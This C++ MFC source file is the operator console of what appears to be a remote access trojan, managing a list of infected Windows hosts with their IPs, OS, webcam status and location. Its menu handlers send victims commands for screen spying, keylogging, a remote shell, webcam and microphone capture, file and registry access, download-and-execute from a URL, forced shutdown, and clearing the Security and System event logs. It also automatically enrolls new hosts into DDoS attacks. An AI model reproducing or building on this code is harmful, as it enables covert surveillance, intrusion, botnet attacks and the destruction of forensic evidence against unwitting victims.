// PcView.cpp : implementation file
//

#include "pcl.h"
#include "Client.h"
#include "PcView.h"

#include "MainFrm.h"
#include "ClientView.h"
#include "InputDlg.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "ChangeGroup.h"
#include "SysInfo.h"
#include "LogView.h"
#include "RegDlg.h"
#include "DllDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pTabView;
extern CPcView* g_pConnectView;
extern CMainFrame* g_pFrame;
extern CLogView* g_pLogView;

typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{_T("外网-IP"),			135	},//0
	{_T("内网-IP"),			100	},//1
	{_T("名称"),			80	},//2
	{_T("系统"),			80	},//3
	{_T("CPU"),				85	},//4
	{_T("内存"),			65  },//5
	{_T("延迟"),			45	},//6
	{_T("视频"),		   	40	},//7
	{_T("筛选"),		  	40	},//8
	{_T("DDOS"),		   	57	},//9
	{_T("版本"),			40	},//10
	{_T("地理位置"),		110	},//11
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);// - !((CClientApp *)AfxGetApp())->m_bIsQQwryExist;
/////////////////////////////////////////////////////////////////////////////
// CPcView

IMPLEMENT_DYNCREATE(CPcView, CXTPListView)

CPcView::CPcView()
{
	if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
	((CClientApp *)AfxGetApp())->m_pConnectView = this;
}

CPcView::~CPcView()
{
}


BEGIN_MESSAGE_MAP(CPcView, CXTPListView)
	//{{AFX_MSG_MAP(CPcView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_CHANGE_GROUP, OnChangeGroup)
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_IP, OnIp)
	ON_COMMAND(IDM_DILIXINXI, OnDilixinxi)
	ON_COMMAND(IDM_ALL, OnAll)
	ON_COMMAND(IDM_CLEAN_System, OnCLEANSystem)
	ON_COMMAND(IDM_CLEAN_Security, OnCLEANSecurity)
	ON_COMMAND(IDM_CLEAN_Application, OnCLEANApplication)
	ON_COMMAND(IDM_SYSINFO, OnSysinfo)
	ON_COMMAND(IDM_REGEDIT, OnRegedit)
	ON_COMMAND(ID_JINCHENG, OnJincheng)
	ON_COMMAND(ID_CHUANGKOU, OnChuangkou)
	ON_COMMAND(ID_CHONGZHI, OnChongzhi)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSINFODIALOG, OnOpenSysInfoDialog)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
	ON_MESSAGE(WM_OPENDLLDLG, OnOpenDllDialog)
	ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
	ON_MESSAGE(WM_NOMODIFYLIST, OnNoModifyList)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcView drawing

void CPcView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPcView diagnostics

#ifdef _DEBUG
void CPcView::AssertValid() const
{
	CXTPListView::AssertValid();
}

void CPcView::Dump(CDumpContext& dc) const
{	
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CClientDoc)));
		CXTPListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPcView message handlers

BOOL CPcView::PreCreateWindow(CREATESTRUCT& cs) 
{
	// TODO: Add your specialized code here and/or call the base class
	cs.style |= LVS_REPORT;
	return CXTPListView::PreCreateWindow(cs);
}

void CPcView::OnInitialUpdate() 
{
	CXTPListView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_pListCtrl = &GetListCtrl();

	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_pListCtrl->SetExtendedStyle(LVIF_PARAM |LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}

	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_header.EnablePopupMenus(TRUE);
   	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);	
    EnableUserSortColor(FALSE);
}

void CPcView::NewInitialUpdate()
{
	CXTPListView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_pListCtrl = &GetListCtrl();

	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_pListCtrl->SetExtendedStyle(LVIF_PARAM |LVS_EX_FULLROWSELECT |LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);

	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}

	HWND hWndHeader = m_pListCtrl->GetDlgItem(0)->GetSafeHwnd();
	m_header.SubclassWindow(hWndHeader);
	m_header.SetTheme(new CXTHeaderCtrlThemeOffice2003());
	m_header.EnablePopupMenus(TRUE);
   	EnableControls(FALSE);
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);	
    EnableUserSortColor(FALSE);	
}

void CPcView::OnSize(UINT nType, int cx, int cy) 
{
	CXTPListView::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (m_pListCtrl == NULL)
		return;
	
	CRect rcClient;
	GetClientRect(rcClient);
	
	int	nClientWidth = rcClient.Width();
	if (nClientWidth < 0) {
		nClientWidth = 1;
	}

	int nIndex = g_Column_Count - 1;
	
	if (nClientWidth < g_Column_Width)
		return;
	
	//m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);
}

void CPcView::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme = m_header.GetTheme();
	if (pTheme)
	{
		DWORD dwStyle = pTheme->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme->SetDrawStyle(dwStyle, &m_header);
		m_header.RedrawWindow();
	}
}

void CPcView::EnableControls(BOOL bRedraw)
{
	XTOSVersionInfo()->IsWinXPOrGreater();
	XTOSVersionInfo()->IsWinXPOrGreater();
	
	if (bRedraw)
	{
		RedrawWindow(NULL, NULL, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);
	}
}

void CPcView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CXTPListView::OnRButtonDown(nFlags, point);
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
// 	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	CXTPCommandBars::TrackPopupMenu(pM, TPM_RIGHTBUTTON,p.x, p.y, AfxGetMainWnd(), 0, 0, 
 		((CXTPFrameWnd*)AfxGetMainWnd())->GetCommandBars());
}

LRESULT CPcView::OnAddToList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	
	if (pContext == NULL)
		return -1;
	
	CString	strToolTipsText, strOS, strLogText;
	try
	{
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		CString	str;
		//		lstrcpy( pContext->m_group, MyDecode(LoginInfo->UpGroup) );
		int nCnt = m_pListCtrl->GetItemCount();
		
		int i = 0;

		i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

		m_pListCtrl->SetItemText(i, 0, IPAddress);

		// 内网IP
		m_pListCtrl->SetItemText(i, 1, inet_ntoa(LoginInfo->IPAddress));

		// 主机名
		m_pListCtrl->SetItemText(i, 2, LoginInfo->HostName);

		////////////////////////////////////////////////////////////////////////////////////////
		//操作系统
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			{
				pszOS = _T("NT");
				g_pFrame->nOSCount[0]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				pszOS = _T("2000");
				g_pFrame->nOSCount[1]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				pszOS = _T("XP");
				g_pFrame->nOSCount[2]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				pszOS = _T("2003");
				g_pFrame->nOSCount[3]++;
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Vista"); 
					g_pFrame->nOSCount[4]++;
				}
				else
				{
					pszOS = _T("2008");
					g_pFrame->nOSCount[5]++;
				}
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win 7");
					g_pFrame->nOSCount[6]++;
				}
                else
				{
					pszOS = _T("2008R2");
					g_pFrame->nOSCount[5]++;
				}
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win 8");
					g_pFrame->nOSCount[7]++;
				}
                else
				{
					pszOS = _T("2012");
					g_pFrame->nOSCount[8]++;
				}
			}
		}	
		strOS.Format
			(
			_T("%s SP%d"),// (Build %d)
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor
			//			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		m_pListCtrl->SetItemText(i, 3, strOS);

		// CPU
		str.Format(_T("%s*%dMHz"), LoginInfo->CPUNumber, LoginInfo->CPUClockMhz);
		m_pListCtrl->SetItemText(i, 4, str);

		//内存大小
		str.Format(_T("%dMB"), LoginInfo->MemSize);
 		m_pListCtrl->SetItemText(i, 5, str);

		// Speed
 		str.Format(_T("%d"), LoginInfo->dwSpeed);
 		m_pListCtrl->SetItemText(i, 6, str);

		//摄像头
		str = LoginInfo->bIsWebCam ? _T("Yes") : _T("No");
		m_pListCtrl->SetItemText(i, 7, str);

		strOS.Replace("Win ", "");
		strToolTipsText.Format("Host	: %s\nCam	: %s\nIP	: %s\nOS	: Windows %s\nGroup	: %s", LoginInfo->HostName, str, IPAddress, strOS, LoginInfo->UpGroup);

		//筛选
		m_pListCtrl->SetItemText(i,8,"--");

		//DDOS
		m_pListCtrl->SetItemText(i,9,"--");

		//版本信息
		str.Format("%s", LoginInfo->szVersion);
 		m_pListCtrl->SetItemText(i, 10, str);


		//m_pListCtrl->SetItemText(i, 10, LoginInfo->szVersion);

		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
		{
            //地理位置
			str = m_QQwry->IPtoAdd(IPAddress);
			m_pListCtrl->SetItemText(i, 11, str);
			strToolTipsText += _T("\nArea	: ");
			strToolTipsText += str;
		}
		else
		{
			m_pListCtrl->SetItemText(i, 11,  _T("无纯真数据库"));
		}
		
		// 指定唯一标识
		g_pFrame->ShowOSCount();
		m_pListCtrl->SetItemData(i, (DWORD) pContext);
        g_pTabView->UpDateNumber();
		g_pFrame->ShowConnectionsNumber();

		if (m_iocpServer->m_bIsAutoD)
		{
			SendAutoAttack(pContext);//新上线自动参与
		}

		if (!((CClientApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);

		if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
			strLogText.Format( "主机上线: [%s]   OS: [Win %s]   Ver: [%s]   地理位置: [%s]   分组: [%s]", IPAddress, strOS, LoginInfo->szVersion, str, LoginInfo->UpGroup );
		else
			strLogText.Format( "主机上线: [%s]   OS: [Win %s]   Ver: [%s]   分组: [%s]", IPAddress, strOS,LoginInfo->szVersion, LoginInfo->UpGroup );
		g_pLogView->InsertLogItem( strLogText, 0, 18 );

	}catch(...){}


	return 0;
}

LRESULT CPcView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	CPcView* pView = NULL;
	CString strOSCount,strLogText,strVersion,IPaddress,strAddr;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		// 删除链表过程中可能会删除Context
		try
		{
			int nCnt = pView->m_pListCtrl->GetItemCount();
			for (int i=0; i < nCnt; i++)
			{
				if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
				{
					strOSCount = pView->m_pListCtrl->GetItemText( i, 3 );
					if ( strOSCount.Find(_T("NT")) != -1 )
					{
						g_pFrame->nOSCount[0]--;
					}
					if ( strOSCount.Find(_T("XP")) != -1 )
					{
						g_pFrame->nOSCount[2]--;
					}
					if ( strOSCount.Find(_T("Vista")) != -1 )
					{
						g_pFrame->nOSCount[4]--;
					}
					if ( strOSCount.Find(_T("Win 7")) != -1 )
					{
						g_pFrame->nOSCount[6]--;
					}
					if ( strOSCount.Find(_T("2000")) != -1 )
					{
						g_pFrame->nOSCount[1]--;
					}
					if ( strOSCount.Find(_T("2003")) != -1 )
					{
						g_pFrame->nOSCount[3]--;
					}
					if ( strOSCount.Find(_T("2008")) != -1 )
					{
						g_pFrame->nOSCount[5]--;
					}
					if ( strOSCount.Find(_T("Win 8")) != -1 )
					{
						g_pFrame->nOSCount[7]--;
					}
					if ( strOSCount.Find(_T("2012")) != -1 )
					{
						g_pFrame->nOSCount[8]--;
					}
					IPaddress = pView->m_pListCtrl->GetItemText( i, 0 );
					strVersion = m_pListCtrl->GetItemText( i, 10);
					strOSCount.Replace("Win ", "");

					if (((CClientApp *)AfxGetApp())->m_bIsQQwryExist)
					{
						strAddr = m_pListCtrl->GetItemText( i, 11 );
						strLogText.Format( "主机下线: [%s]   OS: [Win %s]   Ver: [%s]   地理位置: [%s]",IPaddress,strOSCount,strVersion,strAddr);
					}else
					{
						strLogText.Format( "主机下线: [%s]   OS: [Win %s]   Ver: [%s]",IPaddress,strOSCount,strVersion);
					}
					g_pLogView->InsertLogItem( strLogText, 0, 24 );

					pView->m_pListCtrl->DeleteItem(i);
					break;
				}		
			}
			
			// 关闭相关窗口
			
			switch (pContext->m_Dialog[0])
			{
			case FILEMANAGER_DLG:
			case SCREENSPY_DLG:
			case WEBCAM_DLG:
			case AUDIO_DLG:
			case KEYBOARD_DLG:
			case SYSTEM_DLG:
			case SHELL_DLG:
			case SYSINFO_DLG:
			case REGEDIT_DLG:
			case DLL_DLG:
				//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
				((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
				break;
			default:
				break;
			}
	}catch(...){}
	
	}
	// 更新当前连接总数
	g_pTabView->UpDateNumber();
	g_pFrame->ShowConnectionsNumber();
	g_pFrame->ShowOSCount();
	return 0;
}

void CPcView::SendSelectCommand(PBYTE pData, UINT nSize)
{       
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

void CPcView::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	
	// set sort image for header and sort column.
	//	m_listCtrl.SetSortImage(m_nSortedCol, m_bAscending);
	CXTSortClass csc(m_pListCtrl, m_nSortedCol);
	csc.Sort(m_bAscending, xtSortString);
}

BOOL CPcView::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult) 
{
	// TODO: Add your specialized code here and/or call the base class
	HD_NOTIFY *pHDNotify = (HD_NOTIFY*)lParam;
	if (pHDNotify->hdr.code == HDN_ITEMCLICKA || pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		SortColumn(pHDNotify->iItem, !m_bAscending);
	}
	return CXTPListView::OnNotify(wParam, lParam, pResult);
}

void CPcView::SendDllCommand(LPCTSTR lpDllName, LPBYTE blparam, DWORD datasize)
{
	CString strDllName;
	strDllName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("DLL", lpDllName);
	if (strDllName.GetLength()==0)
	{
		strDllName.Format("%s.dll", lpDllName);
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("DLL", lpDllName, strDllName);
	}
	int		nPacketLength = 1  + strDllName.GetLength() + 1 + datasize +sizeof(DWORD) ;//TOKEN (1)+ 文件名(len+1) + 消息
	
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	memset(lpPacket,0,nPacketLength);
	lpPacket[0] = COMMAND_DLLMAIN;
	
	memcpy(lpPacket + 1, &datasize, 4);
	
	memcpy(lpPacket + 1 + sizeof(DWORD), strDllName.GetBuffer(0), strDllName.GetLength() +1);
	
	memcpy(lpPacket + 1 + sizeof(DWORD) + strDllName.GetLength() +1 , blparam, datasize);
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, lpPacket, nPacketLength);
	}
	delete[] lpPacket;
}

void CPcView::OnFilemanager() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
// 	SendDllCommand("BFileManager",NULL,0);
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
 	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
// 	SendDllCommand("BRemoteScreen",NULL,0);

	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnKeyboard() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnRemoteshell() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnSystem() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
// 	SendDllCommand("BSystem",NULL,0);
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnWebcam() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	SendDllCommand("BWebcam",NULL,0);

// 	BYTE	bToken = COMMAND_WEBCAM;
// 	SendSelectCommand(&bToken, sizeof(BYTE));
//	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	SendDllCommand("BAudioListen",NULL,0);	

// 	BYTE	bToken = COMMAND_AUDIO;
// 	SendSelectCommand(&bToken, sizeof(BYTE));
// 	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnSysinfo() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}

	BYTE	bToken = COMMAND_SYSINFO;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnRegedit() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
// 	SendDllCommand("BRemoteRegedit",NULL,0);	
	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken,sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnRenameRemark() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}

	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format(_T("更改主机(%s)的备注"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 2));
	else
		strTitle = _T("批量更改主机备注");
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 3, dlg.m_str);
	}
	
	delete[] lpPacket;
	LocalFree(lpPacket);
}

void CPcView::OnRemove() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}

	if (MessageBox("确认卸载服务端吗", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnLogoff() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnReboot() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnShutdown() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnDownexec() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	
	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
	LocalFree(lpPacket);
}

void CPcView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	CInputDialog	dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;
	LocalFree(lpPacket);
}

void CPcView::OnCleanevent() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}
void CPcView::OnCLEANSystem() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE	bToken = COMMAND_CLEAN_System;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

void CPcView::OnCLEANSecurity() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	BYTE	bToken = COMMAND_CLEAN_Security;
	SendSelectCommand(&bToken, sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}

